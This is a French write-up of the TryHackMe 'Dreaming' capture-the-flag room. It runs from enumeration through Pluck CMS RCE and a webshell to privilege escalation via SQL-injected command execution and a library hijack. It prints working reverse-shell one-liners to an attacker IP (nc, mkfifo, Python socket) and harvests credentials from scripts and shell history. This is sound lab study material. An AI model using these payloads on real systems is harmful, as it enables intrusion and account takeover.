# Room : Dreaming
Une room "easy" mais pas tant que ca je trouve !
Je l'ai fait en plusieurs jours, donc plusieurs IP différentes.

# Information Gathering
IP : http://10.10.231.193/

Il y a port 80 d'ouvert, on accède a une page Apache2 par defaut.

# Enumeration
## NMAP
```
nmap -sC -sV 10.10.231.193 -p- -o nmap.txt
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 16:03 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for 10.10.231.193
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.74 seconds
```
## Gobuster
```
gobuster dir -u http://10.10.231.193/ -w /usr/share/wordlists/dirb/common.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.193/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/app                  (Status: 301) [Size: 312] [--> http://10.10.231.193/app/]
/.htaccess            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```
Il nous trouve une page **/app** qui contient le dossier **pluck-4.7.13**
Pluck est un CMS (Content Management System).

Visiblement le mot de passe par defaut fonctionne.

# Exploitation
Nous avons l'accès a la page admin du CMS, il existe une RCE concernant Pluck version 4.7.13.
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Dreaming]
└─$ searchsploit pluck 4.7.13                               
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                               | php/webapps/49909.py
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Plus qu'a lancer l'exploit :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Dreaming]
└─$ python3 49909.py 10.10.231.193 80 password /app/pluck-4.7.13 

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.231.193:80/app/pluck-4.7.13/files/shell.phar
```
et nous voila avec un webshell :
```
              

        ___                         ____      _          _ _        _  _   
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

p0wny@shell:…/pluck-4.7.13/files# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
On va s'ouvrir maintenant un vrai reverseshell.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.50.195 4444 >/tmp/f
```
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                                                          
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.231.193] 52666
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dreaming:/var/www/html/app/pluck-4.7.13/files$
```
Et voila :)

# Post Exploitation
On retrouve 3 users :
```
www-data@dreaming:/home/lucien$ cat /etc/passwd | grep "/home"
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
```
## Home de death
```
drwxr-xr-x 4 death death 4096 Aug 25  2023 .
drwxr-xr-x 5 root  root  4096 Jul 28  2023 ..
-rw------- 1 death death  427 Aug 25  2023 .bash_history
-rw-r--r-- 1 death death  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 death death 3771 Feb 25  2020 .bashrc
drwx------ 3 death death 4096 Jul 28  2023 .cache
drwxrwxr-x 4 death death 4096 Jul 28  2023 .local
-rw------- 1 death death  465 Aug 25  2023 .mysql_history
-rw-r--r-- 1 death death  807 Feb 25  2020 .profile
-rw------- 1 death death 8157 Aug  7  2023 .viminfo
-rw-rw-r-- 1 death death  165 Jul 29  2023 .wget-hsts
-rw-rw---- 1 death death   21 Jul 28  2023 death_flag.txt
-rwxrwx--x 1 death death 1539 Aug 25  2023 getDreams.py
```
## Home de lucien
```
drwxr-xr-x 5 lucien lucien 4096 Aug 25  2023 .
drwxr-xr-x 5 root   root   4096 Jul 28  2023 ..
-rw------- 1 lucien lucien  684 Aug 25  2023 .bash_history
-rw-r--r-- 1 lucien lucien  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lucien lucien 3771 Feb 25  2020 .bashrc
drwx------ 3 lucien lucien 4096 Jul 28  2023 .cache
drwxrwxr-x 4 lucien lucien 4096 Jul 28  2023 .local
-rw------- 1 lucien lucien  696 Aug 25  2023 .mysql_history
-rw-r--r-- 1 lucien lucien  807 Feb 25  2020 .profile
drwx------ 2 lucien lucien 4096 Jul 28  2023 .ssh
-rw-r--r-- 1 lucien lucien    0 Jul 28  2023 .sudo_as_admin_successful
-rw-rw---- 1 lucien lucien   19 Jul 28  2023 lucien_flag.txt
```
## Home de morpheus
```
drwxr-xr-x 3 morpheus morpheus 4096 Aug  7  2023 .
drwxr-xr-x 5 root     root     4096 Jul 28  2023 ..
-rw------- 1 morpheus morpheus   58 Aug 14  2023 .bash_history
-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
-rw-rw-r-- 1 morpheus morpheus   66 Jul 28  2023 .selected_editor
-rw-rw-r-- 1 morpheus morpheus   22 Jul 28  2023 kingdom
-rw-rw---- 1 morpheus morpheus   28 Jul 28  2023 morpheus_flag.txt
-rw-rw-r-- 1 morpheus morpheus  180 Aug  7  2023 restore.py
```
### Restore.py
```
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```
## Script dans /opt
### test.py
```
www-data@dreaming:/opt$ cat te
cat test.py 
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[...REDACTED...]"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```
On retrouve ici un mdp
### getDreams.py
```
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```
## Lucien
Nous avons trouver le mdp de Lucien, nous avons donc maintenant son user
```
www-data@dreaming:/opt$ su lucien
su lucien
Password: [...REDACTED...]
```
On en profite pour prendre le flag qui ce trouve dans **/home/lucien**
On va check les droits de lucien
```
lucien@dreaming:~$ sudo -l
sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```
Testons ce script...
```
lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician
```
On ne peux pas le modifier ni le lire, juste l'executer.

Dans l'historique on retrouve le mot de passe du compte de lucien pour mysql : 
```
mysql -u lucien -p[...REDACTED...]
```
## Death
On sait que death peux executer un script python qui va recherche dans une base SQL qui se nomme **library**, nous pouvons acceder a la base SQL avec le compte de lucien.
```
mysql> show tables;
show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from dreams; 
select * from dreams;
+---------------+------------------------------------+
| dreamer       | dream                              |
+---------------+------------------------------------+
| Alice         | Flying in the sky                  |
| Bob           | Exploring ancient ruins            |
| Carol         | Becoming a successful entrepreneur |
| Dave          | Becoming a professional musician   |
+---------------+------------------------------------+
4 rows in set (0.00 sec)

```
On retrouve les mêmes réponses présente lorsqu'on execute le script avec le compte de **death**, peut-être qu'on peu ajouter un shell directement dans SQL afin qu'il soit appeler pendant qu'on execute le script ?

Alors j'en ai test plein...
```
INSERT INTO dreams (dreamer, dream) VALUES ('bash', '-i');
INSERT INTO dreams (dreamer, dream) VALUES ('/bin/sh', 'nc -c /bin/sh 10.11.50.195 4446');
INSERT INTO dreams (dreamer, dream) VALUES ('shell', 'nc -c /bin/sh 10.11.50.195 4446');
INSERT INTO dreams (dreamer, dream) VALUES ('bash -i', 'nc -c /bin/sh 10.11.50.195 4446');
[...]
```
Et finalement, celui-ci a fonctionner et ma donner le shell de **death**
```
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('bash -i', '$(/bin/bash)');
Query OK, 1 row affected (0.01 sec)
```
```
lucien@dreaming:/home/morpheus$ sudo -u death /usr/bin/python3 /home/death/getDreams.py

Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

bash + -i

death@dreaming:/home/morpheus$
```
On en profite pour récup les identifiants de death :
```
DB_USER = "death"
DB_PASS = "[...REDACTED...]"
DB_NAME = "library"
```
et le flag qui ce trouve dans **/home/death**
## Morpheus
L'utilisateur **death** ne peux pas sudo:
```
$ sudo -l 
sudo -l
[sudo] password for death: [...REDACTED...]

Sorry, user death may not run sudo on dreaming.
```
Dans l'historique de **lucien**, je me souvient qu'il y a eu une modification de la lib shutil.py comme on peu le voir ici ligne 12 13 14 15 et 16:
```
lucien@dreaming:/usr/lib/python3.8$ history
    1  ls
    2  cd /etc/ssh/
    3  clear
    4  nano sshd_config
    5  su root
    6  cd ..
    7  ls
    8  cd ..
    9  cd etc
   10  ls
   11  ..
   12  cd ..
   13  cd usr
   14  cd lib
   15  cd python3.8
   16  nano shutil.py 

```
En tant que **lucien** je ne peux pas le modifier, mais en tant que **death** si je peux.
On m'avais dis que modifier les lib n'étais pas une très bonne pratique, mais bon, on va test quand même !

Je vais donc essayer d'y mettre un revshell, je l'ajoute tout en haut de la lib :
```
import os,pty,socket;s=socket.socket();s.connect(("10.11.50.195",4447));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")
```
et me voici **morpheus**
```
listening on [any] 4447 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.84.24] 54694
$ id
id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
```
Le flag est dans **/home/morpheus**
